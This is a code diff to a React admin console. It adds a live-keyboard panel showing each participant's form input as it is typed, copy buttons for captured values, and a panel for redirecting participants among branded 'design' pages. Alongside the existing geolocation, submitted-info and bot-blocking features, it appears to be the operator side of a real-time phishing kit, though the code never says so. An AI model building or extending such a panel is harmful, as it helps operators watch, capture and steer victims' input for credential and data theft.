@@ -1,5 +1,5 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { useEffect, useMemo, useRef, useState } from "react";
+import { useEffect, useMemo, useRef, useState, type MouseEvent as ReactMouseEvent, type ReactNode } from "react";
 import { useServerFn } from "@tanstack/react-start";
 import { supabase } from "@/integrations/supabase/client";
 import {
@@ -14,6 +14,7 @@ import type { RealtimeChannel } from "@supabase/supabase-js";
 import {
   joinChannel,
   type InputPayload,
+  type LiveInputPayload,
   type NavigatePayload,
 } from "@/lib/orchestrator";
 import {
@@ -29,6 +30,7 @@ import {
 import { StatusDot, type DotState } from "@/components/StatusDot";
 import { MollyLogo, type MollyLogoHandle } from "@/components/MollyLogo";
 import { LivePreview } from "@/components/LivePreview";
+import { FloatingPanel } from "@/components/FloatingPanel";
 import { PagesEditor } from "@/components/PagesEditor";
 
 import {
@@ -105,6 +107,7 @@ function Admin() {
   const [section, setSection] = useState<"queue" | "participants">("queue");
   const [nav, setNav] = useState<"participants" | "pages" | "settings">("participants");
   const [events, setEvents] = useState<InputPayload[]>([]);
+  const [liveInputs, setLiveInputs] = useState<Map<string, LiveInputPayload>>(new Map());
   const [previews, setPreviews] = useState<string[]>([]);
   const [designs, setDesigns] = useState<DesignRecord[]>(() => getDesigns());
   const [sidebarOpen, setSidebarOpen] = useState<boolean>(() => {
@@ -152,7 +155,27 @@ function Admin() {
   useEffect(() => {
     const ch = joinChannel({
       key: `admin_${Math.random().toString(36).slice(2, 8)}`,
-      onInput: (p) => setEvents((prev) => [p, ...prev].slice(0, 200)),
+      onInput: (p) =>
+        setEvents((prev) => {
+          // Dedupe: drop if last event matches (pid,field,value) within 300ms.
+          const last = prev[0];
+          if (
+            last &&
+            last.participantId === p.participantId &&
+            last.field === p.field &&
+            last.value === p.value &&
+            Math.abs(p.at - last.at) < 300
+          ) {
+            return prev;
+          }
+          return [p, ...prev].slice(0, 200);
+        }),
+      onLiveInput: (p) =>
+        setLiveInputs((prev) => {
+          const next = new Map(prev);
+          next.set(p.participantId, p);
+          return next;
+        }),
     });
     ch.subscribe(async (status) => {
       if (status === "SUBSCRIBED") {
@@ -395,6 +418,7 @@ function Admin() {
                     onKick={kick}
                     onOpenPreview={openPreview}
                     events={events}
+                    liveInputs={liveInputs}
                     suites={suites}
                   />
                 )}
@@ -609,6 +633,42 @@ function QueueCard({
 }
 
 
+function CopyChip({
+  text,
+  className,
+  title,
+  children,
+}: {
+  text: string;
+  className?: string;
+  title?: string;
+  children: ReactNode;
+}) {
+  const [copied, setCopied] = useState(false);
+  function copy(e: ReactMouseEvent) {
+    e.stopPropagation();
+    if (!text) return;
+    try {
+      void navigator.clipboard.writeText(text);
+      setCopied(true);
+      window.setTimeout(() => setCopied(false), 900);
+    } catch {
+      /* ignore */
+    }
+  }
+  return (
+    <button
+      type="button"
+      className={`copy-chip ${className ?? ""}`}
+      onClick={copy}
+      title={title ?? "Copy"}
+    >
+      {children}
+      {copied && <span className="copy-chip-pill">Copied</span>}
+    </button>
+  );
+}
+
 function ParticipantsPane({
   items,
   onNavigate,
@@ -616,6 +676,7 @@ function ParticipantsPane({
   onKick,
   onOpenPreview,
   events,
+  liveInputs,
   suites,
 }: {
   items: LiveRecord[];
@@ -624,6 +685,7 @@ function ParticipantsPane({
   onKick: (id: string) => void;
   onOpenPreview: (id: string) => void;
   events: InputPayload[];
+  liveInputs: Map<string, LiveInputPayload>;
   suites: SuiteOpt[];
 }) {
   const ids = new Set(items.map((i) => i.id));
@@ -645,6 +707,7 @@ function ParticipantsPane({
                 onOpenPreview={onOpenPreview}
                 suites={suites}
                 events={events.filter((e) => e.participantId === p.id)}
+                liveInput={liveInputs.get(p.id) ?? null}
               />
             ))}
           </div>
@@ -658,14 +721,18 @@ function ParticipantsPane({
             <p className="admin-empty">Waiting for input events. Password fields are excluded.</p>
           )}
           {filteredEvents.map((e, i) => (
-            <div key={i} className="admin-feed-item">
+            <div key={i} className="admin-feed-item admin-feed-item-in">
               <div className="admin-feed-row">
-                <span className="font-mono text-xs">{e.participantId}</span>
+                <CopyChip text={e.participantId} title="Copy participant id" className="copy-chip-inline">
+                  <span className="font-mono text-xs">{e.participantId}</span>
+                </CopyChip>
                 <span className="admin-feed-time">{new Date(e.at).toLocaleTimeString()}</span>
               </div>
               <div className="admin-feed-body">
                 <span className="text-zinc-500">{e.field}:</span>{" "}
-                <span>{e.value || <em className="text-zinc-600">(empty)</em>}</span>
+                <CopyChip text={e.value} title="Copy value" className="copy-chip-inline">
+                  <span>{e.value || <em className="text-zinc-600">(empty)</em>}</span>
+                </CopyChip>
               </div>
               <div className="admin-feed-url">{e.url}</div>
             </div>
@@ -684,6 +751,7 @@ function ParticipantCard({
   onOpenPreview,
   suites,
   events,
+  liveInput,
 }: {
   p: LiveRecord;
   onNavigate: (id: string, suite: Suite, page: Page) => void;
@@ -692,10 +760,11 @@ function ParticipantCard({
   onOpenPreview: (id: string) => void;
   suites: SuiteOpt[];
   events: InputPayload[];
+  liveInput: LiveInputPayload | null;
 }) {
   const [regRev, setRegRev] = useState(0);
   useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
-  const [modal, setModal] = useState<null | "redirect" | "submitted">(null);
+  const [panel, setPanel] = useState<null | "redirect" | "submitted" | "keyboard">(null);
   const [pickedSuite, setPickedSuite] = useState<Suite | null>(null);
 
   const pageOpts: PageOpt[] = useMemo(
@@ -703,24 +772,20 @@ function ParticipantCard({
     [pickedSuite, regRev],
   );
 
-  function close() {
-    setModal(null);
-    setTimeout(() => setPickedSuite(null), 220);
+  function closePanel() {
+    setPanel(null);
+    setTimeout(() => setPickedSuite(null), 200);
   }
 
-
-  // Latest value per field for this participant (no passwords — already filtered at source).
   const submitted = useMemo(() => {
     const map = new Map<string, InputPayload>();
     for (const e of events) {
-      // Exclude button-click signals from submitted info; keep real inputs.
       if (/_clicked$/.test(e.field) || e.field === "continue_clicked") continue;
       const prev = map.get(e.field);
       if (!prev || prev.at < e.at) map.set(e.field, e);
     }
     return Array.from(map.values()).sort((a, b) => b.at - a.at);
   }, [events]);
-
 
   return (
     <article className="admin-card">
@@ -740,7 +805,7 @@ function ParticipantCard({
           <button
             className="admin-icon-btn"
             title="Redirect"
-            onClick={() => setModal("redirect")}
+            onClick={() => setPanel("redirect")}
             aria-label="Redirect participant"
           >
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -751,7 +816,7 @@ function ParticipantCard({
           <button
             className="admin-icon-btn"
             title="View submitted info"
-            onClick={() => setModal("submitted")}
+            onClick={() => setPanel("submitted")}
             aria-label="View submitted info"
           >
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -760,6 +825,17 @@ function ParticipantCard({
               <line x1="12" y1="17" x2="12.01" y2="17" />
             </svg>
             {submitted.length > 0 && <span className="admin-icon-badge">{submitted.length}</span>}
+          </button>
+          <button
+            className="admin-icon-btn"
+            title="Live typing"
+            onClick={() => setPanel("keyboard")}
+            aria-label="Live keyboard"
+          >
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <rect x="2" y="6" width="20" height="12" rx="2" />
+              <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M7 14h10" />
+            </svg>
           </button>
           <button
             className="admin-icon-btn admin-icon-btn-danger"
@@ -788,114 +864,157 @@ function ParticipantCard({
         </div>
         <div className="admin-card-id admin-card-id-bottom">
           <StatusDot state={p.state} />
-          <span className="font-mono text-xs">{p.id}</span>
+          <CopyChip text={p.id} title="Copy participant id" className="copy-chip-inline">
+            <span className="font-mono text-xs">{p.id}</span>
+          </CopyChip>
         </div>
       </div>
       <p className="admin-card-page">on · {pageLabelFromUrl(p.currentUrl)}</p>
       <ParticipantGeoLine p={p} />
 
-
-      {modal && (
-        <div className="admin-modal-backdrop" onClick={close}>
-          <div
-            className="admin-modal"
-            onClick={(e) => e.stopPropagation()}
-            role="dialog"
-            aria-label={modal === "redirect" ? "Redirect participant" : "Submitted info"}
-          >
-            <div className="admin-modal-head">
-              <span>
-                {modal === "redirect"
-                  ? (pickedSuite ? "Choose page" : "Choose design")
-                  : `Submitted by ${p.id}`}
-              </span>
-              <button className="admin-modal-close" onClick={close} aria-label="Close">×</button>
-            </div>
-
-            {modal === "redirect" && !pickedSuite && (
-              <div className="admin-modal-list">
-                {suites.length === 0 && <p className="admin-redirect-empty">No designs yet.</p>}
-                {suites.map((s, i) => {
-                  const logo = getDesignLogo(s.value);
-                  return (
-                    <button
-                      key={s.value}
-                      className="admin-redirect-item"
-                      style={{ animationDelay: `${i * 30}ms` }}
-                      onClick={() => setPickedSuite(s.value)}
-                    >
-                      {logo ? (
-                        <img
-                          src={logo}
-                          alt=""
-                          className="admin-redirect-item-logo"
-                          style={{ width: 22, height: 22, objectFit: "contain", borderRadius: 4 }}
-                        />
-                      ) : (
-                        <span className="admin-redirect-item-dot">▤</span>
-                      )}
-                      <span>{s.label}</span>
-                      <span className="admin-redirect-item-arrow">›</span>
-                    </button>
-                  );
-                })}
-              </div>
-            )}
-
-
-            {modal === "redirect" && pickedSuite && (
-              <div className="admin-modal-list">
-                <button className="admin-redirect-back" onClick={() => setPickedSuite(null)}>
-                  ← back to designs
-                </button>
-                {pageOpts.length === 0 && <p className="admin-redirect-empty">No pages in this design.</p>}
-                {pageOpts.map((pg, i) => (
+      {panel === "redirect" && (
+        <FloatingPanel
+          title={
+            <span>
+              Redirect <span className="font-mono text-[11px] opacity-60">{p.id}</span>
+              {pickedSuite && <span className="opacity-60"> · {pickedSuite}</span>}
+            </span>
+          }
+          accentDot="#8aa6ff"
+          onClose={closePanel}
+          initialSize={{ w: 360, h: 420 }}
+          minSize={{ w: 280, h: 260 }}
+        >
+          {!pickedSuite ? (
+            <div className="admin-modal-list">
+              {suites.length === 0 && <p className="admin-redirect-empty">No designs yet.</p>}
+              {suites.map((s, i) => {
+                const logo = getDesignLogo(s.value);
+                return (
                   <button
-                    key={pg.value}
+                    key={s.value}
                     className="admin-redirect-item"
                     style={{ animationDelay: `${i * 30}ms` }}
-                    onClick={() => {
-                      onNavigate(p.id, pickedSuite, pg.value);
-                      close();
-                    }}
+                    onClick={() => setPickedSuite(s.value)}
                   >
-                    <span className="admin-redirect-item-dot">·</span>
-                    <span>{pg.label}</span>
-                    <span className="admin-redirect-item-arrow">↗</span>
+                    {logo ? (
+                      <img
+                        src={logo}
+                        alt=""
+                        className="admin-redirect-item-logo"
+                        style={{ width: 22, height: 22, objectFit: "contain", borderRadius: 4 }}
+                      />
+                    ) : (
+                      <span className="admin-redirect-item-dot">▤</span>
+                    )}
+                    <span>{s.label}</span>
+                    <span className="admin-redirect-item-arrow">›</span>
                   </button>
-                ))}
-              </div>
-            )}
+                );
+              })}
+            </div>
+          ) : (
+            <div className="admin-modal-list">
+              <button className="admin-redirect-back" onClick={() => setPickedSuite(null)}>
+                ← back to designs
+              </button>
+              {pageOpts.length === 0 && <p className="admin-redirect-empty">No pages in this design.</p>}
+              {pageOpts.map((pg, i) => (
+                <button
+                  key={pg.value}
+                  className="admin-redirect-item"
+                  style={{ animationDelay: `${i * 30}ms` }}
+                  onClick={() => {
+                    onNavigate(p.id, pickedSuite, pg.value);
+                    // Reset to step 1 instead of closing — operator can redirect again.
+                    setPickedSuite(null);
+                  }}
+                >
+                  <span className="admin-redirect-item-dot">·</span>
+                  <span>{pg.label}</span>
+                  <span className="admin-redirect-item-arrow">↗</span>
+                </button>
+              ))}
+            </div>
+          )}
+        </FloatingPanel>
+      )}
 
-            {modal === "submitted" && (
-              <div className="admin-modal-list">
-                {submitted.length === 0 ? (
-                  <p className="admin-redirect-empty">Nothing submitted yet.</p>
-                ) : (
-                  submitted.map((e, i) => (
-                    <div
-                      key={e.field}
-                      className="admin-submitted-item"
-                      style={{ animationDelay: `${i * 40}ms` }}
-                    >
-                      <div className="admin-submitted-field">{e.field}</div>
-                      <div className="admin-submitted-value">
-                        {e.value || <em style={{ color: "#555" }}>(empty)</em>}
-                      </div>
-                      <div className="admin-submitted-meta">
-                        {new Date(e.at).toLocaleTimeString()}
-                      </div>
-                    </div>
-                  ))
-                )}
-              </div>
+      {panel === "submitted" && (
+        <FloatingPanel
+          title={<span>Submitted · <span className="font-mono text-[11px]">{p.id}</span></span>}
+          accentDot="#5dffa3"
+          onClose={closePanel}
+          initialSize={{ w: 380, h: 420 }}
+          minSize={{ w: 280, h: 220 }}
+        >
+          <div className="admin-modal-list">
+            {submitted.length === 0 ? (
+              <p className="admin-redirect-empty">Nothing submitted yet.</p>
+            ) : (
+              submitted.map((e, i) => (
+                <div
+                  key={e.field}
+                  className="admin-submitted-item"
+                  style={{ animationDelay: `${i * 40}ms` }}
+                >
+                  <div className="admin-submitted-field">{e.field}</div>
+                  <CopyChip text={e.value} className="admin-submitted-value copy-chip-block" title="Copy value">
+                    {e.value || <em style={{ color: "#555" }}>(empty)</em>}
+                  </CopyChip>
+                  <div className="admin-submitted-meta">
+                    {new Date(e.at).toLocaleTimeString()}
+                  </div>
+                </div>
+              ))
             )}
           </div>
-        </div>
+        </FloatingPanel>
+      )}
+
+      {panel === "keyboard" && (
+        <FloatingPanel
+          title={<span>Live keyboard · <span className="font-mono text-[11px]">{p.id}</span></span>}
+          accentDot="#ffd25d"
+          onClose={closePanel}
+          initialSize={{ w: 420, h: 220 }}
+          minSize={{ w: 280, h: 160 }}
+        >
+          <KeyboardPanelBody liveInput={liveInput} />
+        </FloatingPanel>
       )}
     </article>
   );
 }
+
+function KeyboardPanelBody({ liveInput }: { liveInput: LiveInputPayload | null }) {
+  if (!liveInput) {
+    return (
+      <div className="kb-panel-empty">
+        <p>Waiting for the participant to focus a field.</p>
+      </div>
+    );
+  }
+  return (
+    <div className="kb-panel">
+      <div className="kb-panel-meta">
+        <span className={`kb-focus-dot ${liveInput.focused ? "is-on" : ""}`} />
+        <span className="kb-panel-field">{liveInput.field}</span>
+        <span className="kb-panel-type">{liveInput.ftype}</span>
+        <span className="kb-panel-time">{new Date(liveInput.at).toLocaleTimeString()}</span>
+      </div>
+      <CopyChip text={liveInput.value} className="kb-panel-value copy-chip-block" title="Copy current value">
+        {liveInput.value ? (
+          <span className="kb-panel-text">{liveInput.value}</span>
+        ) : (
+          <em className="kb-panel-empty-text">(empty)</em>
+        )}
+        <span className="kb-caret" aria-hidden />
+      </CopyChip>
+    </div>
+  );
+}
+
 
 function SettingsPane({
   blockBots,
